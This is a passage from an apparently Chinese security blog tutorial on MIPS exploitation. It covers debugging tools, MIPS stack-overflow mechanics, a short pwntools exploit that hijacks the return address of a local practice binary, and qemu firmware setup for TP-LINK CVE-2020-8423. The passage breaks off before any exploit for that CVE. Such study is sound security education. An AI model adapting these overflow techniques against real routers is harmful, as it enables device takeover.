class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> MIB_CAPTCHA:</span><br><span class="line">			*value = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/8evfxn.png" alt="8evfxn"></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1552161">QEMU chroot进行本地固件调试</a></p>
<p><strong>漏洞相关</strong></p>
<p><strong>pwntools</strong>是一个CTF框架和漏洞利用开发库。它是用Python编写的，旨在用于快速原型开发和开发，旨在使漏洞利用程序编写尽可能简单。<a target="_blank" rel="noopener" href="http://docs.pwntools.com/en/stable/index.html">pwntools官网</a></p>
<p><strong>Gdb-Multiarch</strong> :能够调试多个架构（包括Mips）的gdb调试工具</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure>
<p>安装peda插件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
<p>安装pwndbg插件，安装完成之后进入vim ~&#x2F;.gdbinit将修改插件为pwndbg</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>


<p><strong>gdbserver（mips）</strong></p>
<p>可以自己编译mips版本的也可以下载别人编译好的<a target="_blank" rel="noopener" href="https://github.com/rapid7/embedded-tools">mips版本gdbserver</a>。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rapid7/embedded-tools.git</span><br><span class="line">git clone https://github.com/hugsy/gdb-static</span><br><span class="line">git cloen https://github.com/akpotter/embedded-toolkit</span><br></pre></td></tr></table></figure>
<p><strong>qemu和gdb调试</strong></p>
<p>用户模式调试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> qemu-mipsel -g 9000 vuln</span></span><br><span class="line"><span class="meta">$</span><span class="bash">  gdb-multiarch -q</span></span><br><span class="line">(gdb) target remote 127.0.0.1:9000</span><br></pre></td></tr></table></figure>
<p><strong>gdb命令</strong></p>
<p>因为mips架构下peda插件无法正常运行，所以需要复习一下gdb的一些基础命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">break 下断点</span><br><span class="line">delete 删除断点</span><br><span class="line">continue 运行到下一个断点</span><br><span class="line">backtrace 回溯堆栈调用信息</span><br><span class="line">info 输出信息 比如 info f输出frame信息，info locals输出当前栈所有局部变量 info registers输出寄存器内容</span><br><span class="line"></span><br><span class="line">输出命令x&#x2F;20i</span><br><span class="line">输出数据（64位格式）x&#x2F;20xw</span><br><span class="line">输出数据（32位格式）x&#x2F;20xg</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong><a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadgets</a></strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git &amp;&amp; <span class="built_in">cd</span> ROPgadget</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo pip install capstone</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python setup.py install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget</span></span><br></pre></td></tr></table></figure>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/tacnetsol/ida/blob/master/plugins/mipsrop/mipsrop.py">Mipsrop</a></strong></p>
<p>将下载好的python脚本放入ida的plugins目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tacnetsol&#x2F;ida&#x2F;blob&#x2F;master&#x2F;plugins&#x2F;mipsrop&#x2F;mipsrop.py</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SeHwa&#x2F;mipsrop-for-ida7 #ida7</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-26%20%E4%B8%8A%E5%8D%8812.07.18%E7%9A%84%E5%89%AF%E6%9C%AC%202.png" alt="屏幕快照2021-01-26上午12.07.18的副本2"></p>
<p><strong>编译gdb（失败）</strong></p>
<p>之前我在考虑用ssh开一个终端然后用mips版本的gdb调试，不过所有gdb版本都试了一遍，都出现了各自的问题，可能是我系统版本或者说是工具链版本的问题。下面是交叉编译失败的一些记录。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) file squashfs-root/usr/bin/httpd #设置符号表</span><br><span class="line">(gdb) set arch mips #设置架构</span><br><span class="line">(gdb) set endian big #设置大小端</span><br><span class="line">(gdb) target remote ip:port #连接到调试端口</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/acs2bx.png" alt="acs2bx"></p>
<p>buildroot交叉编译gdb(7.12编译失败了，这里编译7.7)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget https://ftp.gnu.org/gnu/gdb/gdb-7.7.1.tar.gz &amp;&amp; tar zxvf gdb-7.7.1.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir build-mips <span class="comment">#创建生成目录</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure -host=mips-linux CC=mips-linux-gnu-gcc LD=mips-linux-gnu-ld AR=mips-linux-gnu-ar LDFLAGS=<span class="string">&quot;-static&quot;</span> --prefix=/home/migraine/Downloads/gdb-7.7.1/build-mips</span> </span><br><span class="line">CFLAGS=&quot;-static&quot; CPPFLAGS=&quot;-static&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">--prefix表示安装目录</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make install</span></span><br></pre></td></tr></table></figure>
<p>make时候报错，no termacp，那么就安装<a target="_blank" rel="noopener" href="https://ftp.gnu.org/gnu/termcap/">termacp</a>（而且是得交叉编译）将编译好的libtermcap.a放入编译工具默认搜索目录lib（使用-print-file-name来搜索）将termcap.h放入目标include目录。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">configure: error: no termcap library found</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install texinfo</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure --host=mips-linux  CC=mips-linux-gnu-gcc AR=mips-linux-gnu-gcc-ar --prefix=/home/migraine/Downloads/termcap-1.3.1/build-mips</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make install</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> mips-linux-gnu-gcc -print-file-name=libc.a</span></span><br><span class="line">/usr/lib/gcc-cross/mips-linux-gnu/5/../../../../mips-linux-gnu/lib/../lib/libc.a</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cp libtermcap.a /usr/mips-linux-gnu/lib/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cp termcap.h /usr/mips-linux-gnu/include/</span></span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/skyflying2012/article/details/7854588">https://blog.csdn.net/skyflying2012/article/details/7854588</a></p>
<hr>
<h2 id="MIPS指令集"><a href="#MIPS指令集" class="headerlink" title="MIPS指令集"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/gujing001/article/details/8476685">MIPS指令集</a></h2><p><strong>简介：MIPS</strong>是一种采取精简指令集（RISC）的指令集架构，是一种高性能的嵌入式CPU架构，广泛被使用在许多电子产品、网络设备、个人娱乐设备与商业设备上（比如龙芯），在路由器领域也被广泛应用。</p>
<p><strong>Mips常用命令</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>格式</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>lw</td>
<td>lw R1, 0(R2)</td>
<td>从存储器中读取一个word存储（Load）到register中</td>
</tr>
<tr>
<td>sw</td>
<td>sw R1, 0(R2)</td>
<td>把一个word从register中存储（store）到存储器中</td>
</tr>
<tr>
<td>addiu</td>
<td>addiu R1,R2,#3</td>
<td>将一个立即数#3加上R2内容之后存放到目标地址R1</td>
</tr>
<tr>
<td>or</td>
<td>or R1,R2,R3</td>
<td>两个寄存器内容相或</td>
</tr>
<tr>
<td>jalr</td>
<td>jalr R1</td>
<td>使用寄存器的跳转指令</td>
</tr>
</tbody></table>
<p>这里只列举了部分比较典型的几类指令，不过已经足够理解Mips的栈溢出了。</p>
<p><strong>Mips下寄存器的功能</strong></p>
<table>
<thead>
<tr>
<th>REGISTER</th>
<th>NAME</th>
<th>USAGE</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td><code>$zero</code></td>
<td>常量0(constant value 0)</td>
</tr>
<tr>
<td><code>$1</code></td>
<td><code>$at</code></td>
<td>保留给汇编器(Reserved for assembler)</td>
</tr>
<tr>
<td><code>$2-$3</code></td>
<td><code>$v0-$v1</code></td>
<td>函数调用返回值(values for results and expression evaluation)</td>
</tr>
<tr>
<td><code>$4-$7</code></td>
<td><code>$a0-$a3</code></td>
<td>函数调用参数(arguments)</td>
</tr>
<tr>
<td><code>$8-$15</code></td>
<td><code>$t0-$t7</code></td>
<td>暂时的(或随便用的)</td>
</tr>
<tr>
<td><code>$16-$23</code></td>
<td><code>$s0-$s7</code></td>
<td>保存的(或如果用，需要SAVE&#x2F;RESTORE的)(saved)</td>
</tr>
<tr>
<td><code>$24-$25</code></td>
<td><code>$t8-$t9</code></td>
<td>暂时的(或随便用的)</td>
</tr>
<tr>
<td><code>$28</code></td>
<td><code>$gp</code></td>
<td>全局指针(Global Pointer)</td>
</tr>
<tr>
<td><code>$29</code></td>
<td><code>$sp</code></td>
<td>堆栈指针(Stack Pointer)</td>
</tr>
<tr>
<td><code>$30</code></td>
<td><code>$fp</code></td>
<td>帧指针(Frame Pointer)</td>
</tr>
<tr>
<td><code>$31</code></td>
<td><code>$ra</code></td>
<td>返回地址(return address)</td>
</tr>
</tbody></table>
<p><strong>MIPS特点：</strong></p>
<ul>
<li><p>MIPS和MIPSEL是两种架构</p>
<p>MIPS是大端序、MIPSEL是小端序。一般来说大端序列是主流的（和x86和arm相反），不过很多CTF题目都是小端序的。（大端调试需要在gdb和pwntools都特别设置，否则默认小端）</p>
</li>
<li><p>不支持NX（即使编译选项添加了也没有用）</p>
<p>不支持NX即函数的栈&#x2F;bss都是可执行的，当我们的写入栈中的shellcode能够被执行，大大降低了利用难度。</p>
</li>
<li><p>叶子函数和非叶子函数</p>
<ul>
<li><p>在MIPS体系架构下，函数分为叶子函数和非叶子函数。MIPS函数的调用过程与x86不同，x86中函数A调用函数B时，会将A函数的地址压入堆栈中，等到函数B执行完毕返回A函数时候，再从堆栈中弹出函数A的地址。而MIPS中，如果是<strong>叶子函数</strong>，与x86是不同的，函数的返回地址是不会压入栈中的，而是会直接存入寄存器**$ra<strong>中。如果是</strong>非叶子函数（即函数中还调用了其他函数）**，则和x86类似，将地址存入栈中。</p>
</li>
<li><p>另外Mips是没有栈底指针的，只有一个$sp指向栈顶，并且不会像x86那样通过pop或者push调整指针，而是采用<strong>偏移寻址</strong>来访问变量。</p>
<p>非叶子函数如图所示，在函数头部会将调用函数的返回地址即**$ra**存放在栈底（偏移4字节），而在函数快结束时会重新将该值取去出来，放入ra。在这个间段内，如果覆盖了函数栈底，就能够控制程序的流程。</p>
</li>
</ul>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-15%20%E4%B8%8B%E5%8D%886.58.02.png" alt="屏幕快照2021-01-15下午6.58.02"></p>
<p>​	而在叶子函数如下图所示，从函数被调用开始到函数jr ra返回调用函数，数据一直都在**$ra**寄存器中，所以理论上是无法利用的。但是如果缓冲区溢出的足够多，足够越过本函数的栈底，直到覆盖到调用函数的栈底，那么也是能够利用的。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/NPwQFb.png" alt="NPwQFb"></p>
</li>
<li><p>内存中的数据访问（store&#x2F;load）必须严格对齐（至少4字节）</p>
</li>
<li><p><strong>流水线效应</strong>：本应顺序执行的几条指令同时执行，只不过处于不同的执行阶段（一般指令执行阶段包括：取指、间指、执行、中断）如下图所示，参考二次重叠执行方式，第一条指令在执行时候，第二条指令在分析，第三条指令在取指。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/7FoFjq.png" alt="7FoFjq"></p>
<p>举个栗子，流水线会在跳转指令(jal)导致<strong>分支延迟效应</strong>，任何一个分支跳转语句后面的那条语句叫做<strong>分支延迟槽</strong>。当它刚把要跳转到的地址填充好还没完成本条指令时，分支语句后面的那个指令（第三条指令）就执行了。所以下面strrchr函数的参数(<code>$a0</code>)实际上来自于<code>$0</code> 而不是来自于<code>$2</code>。这是在看Mips汇编的时候需要注意的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $a0,$s2</span><br><span class="line">jalr strrchr   &#x2F;&#x2F;arg $a0</span><br><span class="line">mov $a0,$s0</span><br></pre></td></tr></table></figure></li>
<li><p><strong>缓存不一致性（cache incoherency）：</strong></p>
<p>指令Cache和数据Cache两者的同步需要一个时间来同步。需要调用Sleep来让shellcode从数据Cache刷新到指令Cache，否则会执行失败，不能像x86架构下直接跳转到shellcode，而是需要构造一条ROP链接，先调用sleep，然后在跳转到shellcode。</p>
</li>
</ul>
<p><strong>栈溢出实例</strong></p>
<p>还是用我们一开始的vuln程序进行溢出</p>
<p>qemu运行 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g 9000 vuln aaaaaa</span><br></pre></td></tr></table></figure>
<p>gdb远程调试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-mipsel -g 9000 vuln</span><br><span class="line">$  gdb-multiarch -q</span><br><span class="line">(gdb) target remote 127.0.0.1:9000</span><br></pre></td></tr></table></figure>
<p>对has_stack函数下断点。首先查看strcpy的两个参数，首先是strcpy的src，<code>lw a1,56(s8)</code>即从s8寄存器（实际上值和sp是相同的，都是指向栈顶）数据偏移56（+56）的数据写入寄存器a1，即通过s8+56偏移可以获得地址0x76fff2c7，这个地址即存放我输入的aaaa数据。然后我们来看dest，即发生写入的地址，这个参数默认被放在a0里，即s8偏移24位。这样我们就能够计算需要多少数据能覆盖缓冲区了。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-16%20%E4%B8%8B%E5%8D%8811.10.05.png" alt="屏幕快照2021-01-16下午11.10.05"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-16%20%E4%B8%8B%E5%8D%8811.11.03.png" alt="屏幕快照2021-01-16下午11.11.03"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-16%20%E4%B8%8B%E5%8D%8811.12.43.png" alt="屏幕快照2021-01-16下午11.12.43"></p>
<p>然后让我们运行到strcpy结束，能够看到我们写入的数据（sp偏移24）。而我们知道返回地址是sp偏移4位，因为这条汇编代码 <code>        004003e8 34 00 bf af     sw         ra,local_4(sp)</code>，所以我们只需要写入20+4字节数据就能覆盖返回地址。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-16%20%E4%B8%8B%E5%8D%8811.26.42.png" alt="屏幕快照2021-01-16下午11.26.42"></p>
<p>即下图所示的位置。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-16%20%E4%B8%8B%E5%8D%8811.31.08.png" alt="屏幕快照2021-01-16下午11.31.08"></p>
<p>经过实际测试我们输入28+4个字节能够覆盖到返回地址，下图中也显示程序的流程被我们所控制。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/Ei5El0.png" alt="Ei5El0"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/eZX7ro.png" alt="eZX7ro"></p>
<p>接下来让我们写一个简单的exploit，运行exp就能获得shell（不过不是qemu里面的shell，而是系统的shell，这点很奇怪，也许是qemu用户模式并没有挂文件系统和内核的缘故）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;vuln&quot;</span></span><br><span class="line"></span><br><span class="line">back_door=<span class="number">0x0400390</span></span><br><span class="line">payload=p32(<span class="number">0x12345678</span>)*<span class="number">7</span>+p32(back_door)</span><br><span class="line"></span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">io=process(argv=[<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;./vuln&quot;</span> , payload])</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;Debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://media.giphy.com/media/LyzVgi3PRP6IcT0lkj/giphy.gif"></p>
<p>这里贴上一个链接，方便指令集查阅<a target="_blank" rel="noopener" href="https://blog.csdn.net/gujing001/article/details/8476685">https://blog.csdn.net/gujing001/article/details/8476685</a></p>
<hr>
<h2 id="CVE-2020-8423"><a href="#CVE-2020-8423" class="headerlink" title="CVE-2020-8423"></a>CVE-2020-8423</h2><p>漏洞设备：TP-LINK TL-WR841N V10</p>
<p>漏洞原因：栈溢出</p>
<blockquote>
<p>CVE-2020-8423是TP-LINK路由器中http服务在解析用户HTTP头中字符串没有设置正确的缓冲区大小而导致的栈溢出。</p>
</blockquote>
<h3 id="配置运行环境"><a href="#配置运行环境" class="headerlink" title="配置运行环境"></a>配置运行环境</h3><p>因为手头没有真机，所以我们选择用qemu来模拟路由器。</p>
<p><strong>Qemu System模式运行</strong></p>
<p>首先下载路由器对应版本的<a target="_blank" rel="noopener" href="https://www.tp-link.com/no/support/download/tl-wr841n/v10/">固件</a>,然后使用binwalk对固件进行解压。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me TL-WR841N_V10_150310.zip</span><br><span class="line">cd _TL-WR841N_V10_150310.zip.extracted/_wr841nv10_wr841ndv10_en_3_16_9_up_boot\(150310\).bin.extracted/squashfs-root/</span><br></pre></td></tr></table></figure>
<p>首先我们需要桥接qemu，使得我们能够传输我们的文件系统squashfs-root到虚拟机中。这部分比较麻烦而且容易忘记，所以记录一下。启动系统用下面的命令就可以了(这个固件是32位的，请不要用64位qemu运行)。如果启动不起来或者很慢，重新下一下qcow2，可能之前的某些操作把镜像弄坏了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mips -M malta -kernel /home/migraine/Documents/vmlinux-2.6.32-5-4kc-malta -hda /home/migraine/Documents/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic, -net tap -nographic </span><br><span class="line"><span class="meta">#</span><span class="bash">更换内核(wget https://people.debian.org/\~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta)</span></span><br><span class="line">sudo qemu-system-mips -M malta -kernel /home/migraine/Documents/vmlinux-3.2.0-4-4kc-malta -hda /home/migraine/Documents/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic, -net tap -nographic</span><br><span class="line">映射端口 -redir tcp:80::8080</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/bamjI1.png" alt="bamjI1"></p>
<p><strong>配置桥接</strong></p>
<p>我们需要将文件系统传入虚拟机中然后运行固件，为了能让qemu和宿主机传输文件，先要配置桥接网络(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pengdonglin137/p/5023340.html">参考链接</a>)</p>
<p>1.配置桥接网卡</p>
<p>安装bridge-utils和uml-utilities</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get  install bridge-utils</span><br><span class="line">sudo apt-get install uml-utilities</span><br></pre></td></tr></table></figure>
<p>然后修改&#x2F;etc&#x2F;network&#x2F;interfacces为</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet manual</span><br><span class="line">up ifconfig eth0 0.0.0.0 up</span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">bridge_ports eth0</span><br><span class="line">bridge_stp off</span><br><span class="line">bridge_maxwait 1</span><br></pre></td></tr></table></figure>
<p>编辑&#x2F;etc&#x2F;qemu-ifup，使qemu在启动中自动将网卡(Default:tap0&#x2F;tap1)加入到桥接网卡。这是关键的一步。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing up $1 for bridged mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0...&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line"><span class="meta">#</span><span class="bash">sudo ifconfig br0 10.211.55.6/24</span></span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure>
<p>重启后我们主机的ip会多一个桥接。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/kD5spW.png" alt="kD5spW"></p>
<p>2.配置桥接网卡的地址</p>
<p>接着让我们设置桥接的地址。比如我目前宿主机（运行在parralell下）的地址是10.211.55.5，所以我使用命令 <code>ifconfig br0 10.211.55.6/24 up</code> 修改桥接网卡(或者在etc&#x2F;qemu-ifup中加上<code>sudo ifconfig br0 10.211.55.6/24</code> ，这样只要qemu开启就会自动设置br0)。</p>
<p>然后我们在qemu中也用ifconfig设置ip为10.211.55.7&#x2F;24，这样宿主机和qemu就能够相互ping通了。（只要在同一网段即可）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">在虚拟机内部</span></span><br><span class="line">ifconfig eth0 10.211.55.7/24 up</span><br><span class="line"><span class="meta">#</span><span class="bash">在虚拟机外部(设置桥接)</span></span><br><span class="line">ifconfig br0 10.211.55.6/24 up </span><br></pre></td></tr></table></figure>
<p><strong>需要注意的是：要保证qemu内的ip子网掩码和桥接网卡一致，否则虽然宿主机和qemu都可以访问桥接网卡，但是两者不能相互通信。</strong></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-18%20%E4%B8%8B%E5%8D%883.43.57.png" alt="屏幕快照2021-01-18下午3.43.57"></p>
<p>尝试去ping宿主机。然后通过scp来传输文件。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~# ifconfig eth0 10.211.55.7/24 up</span><br><span class="line">root@debian-mips:~# ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:0c:29:ee:39:39  </span><br><span class="line">          inet addr:10.211.55.6  Bcast:10.211.55.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:feee:3939/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:13 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:2862 (2.7 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020</span><br><span class="line"><span class="meta">#</span><span class="bash">将文件系统传入qemu虚拟机</span></span><br><span class="line">scp -r squashfs-root/ root@10.211.55.7:~/</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/gTa8n0.png" alt="gTa8n0"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/keK6iz.png" alt="keK6iz"></p>
<p>传输文件，然后在qemu中就能看到我们传输的文件了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshpass -p root  scp -r squashfs-root/ root@10.211.55.7:~/</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/CGUSlu.png" alt="CGUSlu"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/lrlzQq.png" alt="lrlzQq"></p>
<p><strong>挂载固件的文件系统</strong></p>
<p>挂载系统的proc到我们固件目录下的<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/26923061">proc</a>.这样我们的程序在访问一些内核信息时候能够读取到，否则程序可能会运行错误。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 挂载文件系统</span></span><br><span class="line">mount --bind /proc squashfs-root/proc</span><br><span class="line"><span class="meta">#</span><span class="bash"> 更换root目录</span></span><br><span class="line">chroot . bin/sh</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/djQtTT.png" alt="djQtTT"></p>
